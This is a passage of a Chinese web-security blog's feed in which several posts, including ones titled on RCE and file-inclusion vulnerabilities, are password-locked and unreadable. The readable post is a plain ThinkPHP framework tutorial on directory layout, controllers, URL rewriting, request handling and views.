    <id>https://da4er.top/RCE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-04-07T06:20:55.000Z</published>
    <updated>2020-04-07T06:26:56.853Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c80b55e7c49eff9fba0eccb7453aa620bb66301ea2888fbaff3113645ba6d772"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含漏洞学习笔记</title>
    <link href="https://da4er.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://da4er.top/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-03-30T12:25:20.000Z</published>
    <updated>2020-03-30T12:30:02.182Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="2edc7683419c498d0a2f8e01a9cbda9bbdea417e47df7f378187af91da710928"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>2020_3月总结</title>
    <link href="https://da4er.top/2020-3%E6%9C%88%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/2020-3%E6%9C%88%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-26T13:23:30.000Z</published>
    <updated>2020-03-26T13:24:13.778Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="44a57f5f3555a6f9834e1838eb7648051d62e13f773fa5052600fd9accbbbcab">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7fe9c57c9fac8e22409e45fb108c08be92b817b15d2042741846e22f40289db9964c5f6e358fe803d8382135dd9543fd36e724d1e2a1dfb5dc31e719cadf33c286ba9383401706cff4dedf77d4e1c7b994a46a8056555b1ad5c64b2a4d67e751a5d6de39790a6d398ac5e7c8c97d15ab9446aca76fc15b3196bdc87f8c5cf30bd9952fb61d0648e73399741b62d69097b1ef9026b0b5d2311c23ee22c7ffec850e6edfd64b5744132098ffa68baccb86d5a14b04179a9a4fc6982a216bfeb2ad6f132bf63ce53c11ec14d227cfb8fc876cba33e6f5ffcaf673f1d7ce688371bc07b9c0c8e097da96216b50069628795325b0cc975c21bb8890f5d816b4e3ab648e82282f60c617dc944e0c382dfd306ecfdfc8ec78cca4a1cb3f890da6a3b1e012992c910d5bbbb7e5478f58792917bedc306db66e9f2b648c86262e910e5c809e3cff4613e3c368c979cff9ea0b09c74c983055d62c04cc499761debd650ddce3eba3465dd5079b334df3d453bafe093aca41f732e966be8fc3db0484644f32da34f5bbc505f4e628df36ed452751b2cda36454f203f234d509b6949a56f7191b1ac2c1883a9113013b568baa0f44ebe01d52c16a65ff7b3bdf377fbbf5a333ca31469bb95c8cb80ba197980a19d43ceae97efee5b6dcbc8ad2a9c7f9ef3e5fa75b756996ed4697f4c68e51f42ae433c89d7cce8b99eb73710c8b2f8052cd0dfe6cdfaacd589065696977b6a0f6cea503882397f73d8aedddd36352f498cc5986343979a0a22cdd345195e08aed084564383c839b90278089d79ff5b4261ec37d9a47574e405049f220ec612550ae69f729c8db8433b7f85740507614c253fa9d26b19081146146aace0de468d900980534845b9ad3341b2135bba278696f1e00115ad60c51fb552b66ea7194499bff2934ece9755171e76811e800977b5260fb186b1996c66adb768d5942aa27aecd6240a8e6cae14cdf7f61b8fa4c40a96c90da001a65b2872881f801613c94a0f6a62180b06b2b7e378c79876665b65524f0e2f2e783c271bfaaabc62706a84da51db463614658819a7213bf4876576d7dd6dd9fe01612a9be39fc03b5eed712c7369e356744a29d41cc24fa8659a64750c3701833701546545862a6e7ad6ea0d7e089c16fc01989050c7f1fb8b3a6bf31b5e0495ddc190446d77cf1e34bab5ed9366842fdb356c107ed37338ef01572813010793a78759a2a920a64e75eefc141b434f1bfe9deb6c22fd61e96362985418f41eb123149b21d32a308e413209bdf0f4e4ac9d260bdaec21000955e1e6c7e1551d2047808b9e54813cebdc1c71193e1aa2b014d9d017ac39df698cdde5efdc7ed60f70974baadb9c155cb74b5cc60562ac70acb448eb5477a53099f7c6430a2e3b3eda5f0ea02615f921db2ffec433cd56295cebabbe9f39d70f539f20111e260413af3bbaa17e6bb79362e9e681247646afdc793984854d21bdd47ebfdec4c17a60aa8665ff541bfde4a863be1ccc117d923b69c53326eb0fc3e46917f47c137893040c55ec3648e3a44c31f1479613866dac4b63541bcdb88853cad0233396d7b3b367fb88beebe6dcef2a457ca5a243ba50761b092c87f7cf8de1d53961cfeb36a9c02dc19111d66c193b8a86d1b3c50035ebca6d89d6b4ebfe8a41f27d3b456b93a8e0124f7d8a743cb400dedfec6440e458bfd31a8fe010750fcb02a743dc4d91934ec4b16ca8b4deb41ad394d5dc659a01b4cfedeeaaaee4c1347ed0c4fbdc8b0740bbe778650626ba892c0946ad3d4b484caba86d14c7e5a646459c079e6cf794d427dbbcb47edd70f838fc98dd6dc78536b096f6a93174e3bc228053e15e74e3ef410b49a17b32407fe8aa3c22a38e0461c98bfbb3e7ef5c95a0f96b349dde5030691e7f1f1b61b1b19941000dadd2ab991f9f93d3ca45c9f85a8951224b7c37b294a59c77fa71c171bf263722f9a413f5adda73086e97aeb24c6148f98a54344c5faac127463f79c296efd576cc56e7c9509ab40929c4f7a23f93127832822c10ba88763a645c8b35fa59464d807f1c9f4cff7169de37de80a62dc79c4962c0499f4f2dc1c139df9e8b12f1a038e11e52dd931550d9134b2dc1015a33fc8a75f13b069524fbd5d75d34eee6da08bf694efdc288607db860e8a54b419016c2f7943dee3edc7749fc4bd5b8b2a5955a66ca516c7571b01d1fb4946fa4a37aaa90c401ef8fda8a930ade3ccc3e9d2320873e11d99b1bf3d68a4f008c0</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>ThinkPHP学习</title>
    <link href="https://da4er.top/ThinkPHP%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://da4er.top/ThinkPHP%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-26T12:58:08.000Z</published>
    <updated>2020-03-28T10:21:00.459Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><h4 id="框架概述"><a href="#框架概述" class="headerlink" title="框架概述"></a>框架概述</h4><blockquote><p>框架就是一些代码类、方法（函数）、变量、常量的集合，这些代码是功能结构性的代码（并非业务代码）。业务代码其实就是具体的一些模块的增删改查逻辑代码。使用框架开发项目，有便于代码重用、开发效率高、代码规范好、便于功能扩展等优点。</p></blockquote><p><strong>一般框架都是基于MVC架构。</strong></p><a id="more"></a><hr><h4 id="PHPStudy构建虚拟主机"><a href="#PHPStudy构建虚拟主机" class="headerlink" title="PHPStudy构建虚拟主机"></a>PHPStudy构建虚拟主机</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/1.png" class title="This is an test image"><p><strong>ThinkPHP的主目录在public下。</strong><br>成功配置会显示：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/2.png" class title="This is an test image"><hr><h4 id="TP框架基础"><a href="#TP框架基础" class="headerlink" title="TP框架基础"></a>TP框架基础</h4><h5 id="TP框架的基本结构"><a href="#TP框架的基本结构" class="headerlink" title="TP框架的基本结构"></a>TP框架的基本结构</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"> 1.project  应用部署目录</span><br><span class="line"> 2.├─application           应用目录（可设置）</span><br><span class="line"> 3.│  ├─common             公共模块目录（可更改）</span><br><span class="line"> 4.│  ├─index              模块目录(可更改)</span><br><span class="line"> 5.│  │  ├─config.php      模块配置文件</span><br><span class="line"> 6.│  │  ├─common.php      模块函数文件</span><br><span class="line"> 7.│  │  ├─controller      控制器目录</span><br><span class="line"> 8.│  │  ├─model           模型目录</span><br><span class="line"> 9.│  │  ├─view            视图目录</span><br><span class="line">10.│  │  └─ ...            更多类库目录</span><br><span class="line">11.│  ├─command.php        命令行工具配置文件</span><br><span class="line">12.│  ├─common.php         应用公共（函数）文件</span><br><span class="line">13.│  ├─config.php         应用（公共）配置文件</span><br><span class="line">14.│  ├─database.php       数据库配置文件</span><br><span class="line">15.│  ├─tags.php           应用行为扩展定义文件</span><br><span class="line">16.│  └─route.php          路由配置文件</span><br><span class="line">17.├─extend                扩展类库目录（可定义）</span><br><span class="line">18.├─public                WEB 部署目录（对外访问目录）</span><br><span class="line">19.│  ├─static             静态资源存放目录(css,js,image)</span><br><span class="line">20.│  ├─index.php          应用入口文件</span><br><span class="line">21.│  ├─router.php         快速测试文件</span><br><span class="line">22.│  └─.htaccess          用于 apache 的重写</span><br><span class="line">23.├─runtime               应用的运行时目录（可写，可设置）</span><br><span class="line">24.├─vendor                第三方类库目录（Composer）</span><br><span class="line">25.├─thinkphp              框架系统目录</span><br><span class="line">26.│  ├─lang               语言包目录</span><br><span class="line">27.│  ├─library            框架核心类库目录</span><br><span class="line">28.│  │  ├─think           Think 类库包目录</span><br><span class="line">29.│  │  └─traits          系统 Traits 目录</span><br><span class="line">30.│  ├─tpl                系统模板目录</span><br><span class="line">31.│  ├─.htaccess          用于 apache 的重写</span><br><span class="line">32.│  ├─.travis.yml        CI 定义文件</span><br><span class="line">33.│  ├─base.php           基础定义文件</span><br><span class="line">34.│  ├─composer.json      composer 定义文件</span><br><span class="line">35.│  ├─console.php        控制台入口文件</span><br><span class="line">36.│  ├─convention.php     惯例配置文件</span><br><span class="line">37.│  ├─helper.php         助手函数文件（可选）</span><br><span class="line">38.│  ├─LICENSE.txt        授权说明文件</span><br><span class="line">39.│  ├─phpunit.xml        单元测试配置文件</span><br><span class="line">40.│  ├─README.md          README 文件</span><br><span class="line">41.│  └─start.php          框架引导文件</span><br><span class="line">42.├─build.php             自动生成定义文件（参考）</span><br><span class="line">43.├─composer.json         composer 定义文件</span><br><span class="line">44.├─LICENSE.txt           授权说明文件</span><br><span class="line">45.├─README.md             README 文件</span><br><span class="line">46.├─think                 命令行入口文件</span><br></pre></td></tr></table></figure><h5 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h5><p>1.三个层级的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">框架主配置文件（惯例配置文件） thinkphp&#x2F;convention.php</span><br><span class="line">应用公共配置文件 application&#x2F;config.php， application&#x2F;database.php </span><br><span class="line">对整个应用生效模块配置文件 application&#x2F;模块目录&#x2F;config.php 对当前模块生效</span><br></pre></td></tr></table></figure><p>2.其他说明:<br>配置文件格式 return array( 键值对 );<br>加载顺序： 框架主配置文件 》 应用公共配置文件 》 模块配置文件<br>配置文件生效顺序： 后加载的生效（后加载的配置项会覆盖之前配置项）<br><strong>如果要手动进行配置，一般不要修改框架本身的主配置文件，而是在应用或者模块配置文件中进行配置。</strong></p><h5 id="函数文件"><a href="#函数文件" class="headerlink" title="函数文件"></a>函数文件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">框架助手函数文件：thinkphp&#x2F;helper.php</span><br><span class="line">应用公共函数文件：application&#x2F;common.php</span><br><span class="line">模块函数文件：application&#x2F;模块目录&#x2F;common.php</span><br></pre></td></tr></table></figure><hr><h4 id="框架的生命周期"><a href="#框架的生命周期" class="headerlink" title="框架的生命周期"></a>框架的生命周期</h4><p>通俗的讲就是：一个url请求从开始到结束的流程</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/3.png" class title="This is an test image"><hr><h4 id="TP中的Controller"><a href="#TP中的Controller" class="headerlink" title="TP中的Controller"></a>TP中的Controller</h4><h5 id="后缀名"><a href="#后缀名" class="headerlink" title="后缀名"></a>后缀名</h5><p>一般TP框架，默认的controller是无特殊后缀的，例如：<strong>index的控制器就是Index.php，类名是Index。</strong><br>如果想要加特殊后缀，需要在配置文件中进行修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;controller_suffix&#39; &#x3D;&gt; &#39;Controller&#39;</span><br></pre></td></tr></table></figure><p>那么我们在创建TP框架的时候必须加上Controller，例如：<strong>现在的index的控制器就是IndexController，类名为：IndexController</strong> </p><h5 id="定义控制器"><a href="#定义控制器" class="headerlink" title="定义控制器"></a>定义控制器</h5><p>定义位置：application/模块目录/controller/目录下<br>命名规则：控制器名称（首字母大写） + (控制器后缀，默认没有) + .php</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/4.png" class title="This is an test image"><p>编写控制器：<br>1.声明命令空间：namespace app\模块目录名\controller<br>2.引入控制器基类（可选） use think\Controller; think是命名空间 Controller是基类控制器<br>3.定义当前控制器类，继承控制器基类（可选）<br>例如：定义一个test控制器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     Test</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-03-26</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"hello world"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">da4er</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"https://da4er.top"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="框架的控制器"><a href="#框架的控制器" class="headerlink" title="框架的控制器"></a>框架的控制器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">命名空间本身是PHP就有的，用来防止命名冲突问题的。</span><br><span class="line">TP框架中的命名空间，通常和目录挂钩。</span><br><span class="line">原因：TP中的自动加载机制，会将类的命名空间作为加载路径的一部分。</span><br></pre></td></tr></table></figure><p>TP框架的使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">①声明命名空间 使用namespace关键字</span><br><span class="line">②引入指定的类 使用use关键字 命名空间\类名称</span><br><span class="line">③完全限定式访问 在使用类时，\完整命名空间\类名称（继承和实例化）</span><br></pre></td></tr></table></figure><h4 id="url访问"><a href="#url访问" class="headerlink" title="url访问"></a>url访问</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/5.png" class title="This is an test image"><p>还有一种隐藏入口文件的写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;域名&#x2F;模块名&#x2F;控制器名称&#x2F;操作方法名称&#x2F;参数名&#x2F;参数值</span><br></pre></td></tr></table></figure><p>隐藏入口文件我们需要对apache进行重写，具体操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.httpd.conf配置文件中加载了mod_rewrite.so模块</span><br><span class="line">2.AllowOverride None 将None改为 All</span><br><span class="line">3.把下面的内容保存为.htaccess文件放到应用入口文件的同级目录下</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">2.Options +FollowSymlinks -Multiviews</span><br><span class="line">3.RewriteEngine on</span><br><span class="line">4.</span><br><span class="line">5.RewriteCond %&#123;REQUEST_FILENAME&#125; !-d</span><br><span class="line">6.RewriteCond %&#123;REQUEST_FILENAME&#125; !-f</span><br><span class="line">7.RewriteRule ^(.*)$ index.php?&#x2F;$1 [QSA,PT,L]</span><br><span class="line">8.&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure><p><strong>使用Apapche的重写机制隐藏入口文件后，如果在整个url后面加上.html后缀, 让整个url看起来像是访问的静态页面。这叫做“伪静态”。</strong></p><hr><h4 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h4><p>我们可以在application/config.php下开启调试模式</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/6.png" class title="This is an test image"><p>开启前后对比：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/7.png" class title="This is an test image"><hr><h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><p>一般TP的模块需要三个目录(MVC) 两个php文件(common,config)</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/8.png" class title="This is an test image"><h4 id="设置默认访问模块"><a href="#设置默认访问模块" class="headerlink" title="设置默认访问模块"></a>设置默认访问模块</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/9.png" class title="This is an test image"><h4 id="命令行创建模块"><a href="#命令行创建模块" class="headerlink" title="命令行创建模块"></a>命令行创建模块</h4><p>一般在TP的根目录下，有一个think文件，我们可以通过命令行执行这个文件，创建模块或控制器等。</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/10.png" class title="This is an test image"><h5 id="创建模块-1"><a href="#创建模块-1" class="headerlink" title="创建模块"></a>创建模块</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think build --module 模块名</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/11.png" class title="This is an test image"><p>执行成功后会自动生成那个五个文件，不需要手动创建。</p><h5 id="创建控制器"><a href="#创建控制器" class="headerlink" title="创建控制器"></a>创建控制器</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php think make:controller 模块名/控制器名 </span><br><span class="line">php think make:controller 模块名/控制器名 --plain</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/12.png" class title="This is an test image"><p>创建控制器时，同样会创建一些常用的方法。</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/13.png" class title="This is an test image"><p><strong>加上 –plain 参数 表示创建没有方法的空控制器类。否则控制器类中会自带一些方法。</strong><br>比如：创建home模块Index控制器，执行命令 php think make:controller home/Index即可。<br><strong>注意：控制器名首字母大写。</strong></p><h5 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php think make:model 模块名&#x2F;模型名</span><br></pre></td></tr></table></figure><p><strong>注意：模型名首字母大写</strong></p><hr><h3 id="Request请求类"><a href="#Request请求类" class="headerlink" title="Request请求类"></a>Request请求类</h3><h4 id="1-获取输入变量"><a href="#1-获取输入变量" class="headerlink" title="1.获取输入变量"></a>1.获取输入变量</h4><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/14.png" class title="This is an test image"><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/15.png" class title="This is an test image"><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/16.png" class title="This is an test image"><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/17.png" class title="This is an test image"><p>总体来说获取输入变量有四个方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1.通过创建request类</span><br><span class="line">$request &#x3D; \think\Request::instance();</span><br><span class="line">$name &#x3D; $request-&gt;param(&#39;name&#39;);</span><br><span class="line">echo $name;</span><br><span class="line"></span><br><span class="line">2.通过tp提供的request()助手函数</span><br><span class="line">$request1 &#x3D; request();</span><br><span class="line">$id &#x3D; $request1-&gt;param(&quot;id&quot;);</span><br><span class="line">echo $id;</span><br><span class="line"></span><br><span class="line">3.通过继承Controller类</span><br><span class="line">$request3 &#x3D; $this-&gt;request;</span><br><span class="line">$password &#x3D; $request3-&gt;param(&quot;pw&quot;);</span><br><span class="line">echo $password;</span><br><span class="line"></span><br><span class="line">4.通过input()函数</span><br><span class="line">$in &#x3D; input(&quot;param.qq&quot;);</span><br><span class="line">echo $in;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.tpshop.com&#x2F;index&#x2F;test&#x2F;da4er&#x2F;name&#x2F;da4er&#x2F;id&#x2F;1&#x2F;pw&#x2F;3333&#x2F;qq&#x2F;666</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/18.png" class title="This is an test image"><h4 id="参数绑定"><a href="#参数绑定" class="headerlink" title="参数绑定"></a>参数绑定</h4><p><strong>方法参数绑定是把URL地址（或者路由地址）中的变量作为操作方法的参数直接传入。</strong><br>这样就可以直接在方法里使用。<br>例如如下代码：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/19.png" class title="This is an test image"><p>在我们方法这个方式时，传递的id参数值会直接输出。</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/20.png" class title="This is an test image"><p>我们可以随意添加参数：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/21.png" class title="This is an test image"><h4 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h4><p>听起来很高大上，其实通俗的讲就是：我们<strong>声明的一个类的实例，在另一个类的方法的参数中传递。</strong></p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/22.png" class title="This is an test image"><p>在TP框架中也有使用的依赖注入：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/23.png" class title="This is an test image"><p>所以我们可以直接调用request类的方法。<br>如下图使用：</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/24.png" class title="This is an test image"><p>对Request类的总结：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.获取请求对象  </span></span><br><span class="line">$request = request();</span><br><span class="line">$request = \think\Request::instance();</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;request; <span class="comment">//仅限于继承了底层控制器的情况下</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">(Request $request)</span>  //依赖注入</span></span><br><span class="line"><span class="function"> //2. 接收请求参数 <span class="title">param</span>方法</span></span><br><span class="line">$params = $request-&gt;param();</span><br><span class="line">$params = input();</span><br><span class="line">$params = request()-&gt;param();</span><br><span class="line">$id = $request-&gt;param(<span class="string">'id'</span>);</span><br><span class="line">$id = input(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">edit</span><span class="params">($id)</span>//参数绑定</span></span><br></pre></td></tr></table></figure><hr><h3 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h3><h4 id="视图的组成"><a href="#视图的组成" class="headerlink" title="视图的组成"></a>视图的组成</h4><p><strong>TP框架下有一个封装好的View类，可以类似Smarty一样对html赋值</strong></p><h4 id="模板的定义"><a href="#模板的定义" class="headerlink" title="模板的定义"></a>模板的定义</h4><p>为了对模板文件更加有效的管理，ThinkPHP对模板文件进行目录划分，默认的模板文件定义规则是：视图目录/控制器名（小写）/操作名（小写）+模板后缀<br>比如：admin模块index控制器的index方法调用的模板定义在了view/index/index.html</p><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/25.png" class title="This is an test image"><h4 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h4><p>在控制器方法中渲染有两种方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一种：使用assign方法进行模板赋值，使用fetch方法进行模板渲染。</span><br><span class="line">第二种：使用助手函数view(), 进行模板渲染并赋值。</span><br></pre></td></tr></table></figure><img src="/ThinkPHP%E5%AD%A6%E4%B9%A0/26.png" class title="This is an test image"><h4 id="整合模板和框架"><a href="#整合模板和框架" class="headerlink" title="整合模板和框架"></a>整合模板和框架</h4><p>模板整合思路：</p><p>①确定页面的访问路径（模块、控制器、方法）<br>②新建对应的控制器方法，在方法中调用模板<br>③将模板页面移动到对应的视图目录下（创建子目录）<br>④将静态资源文件移动到public/static/admin目录下<br>⑤修改模板文件中静态资源路径</p><h5 id="模板布局"><a href="#模板布局" class="headerlink" 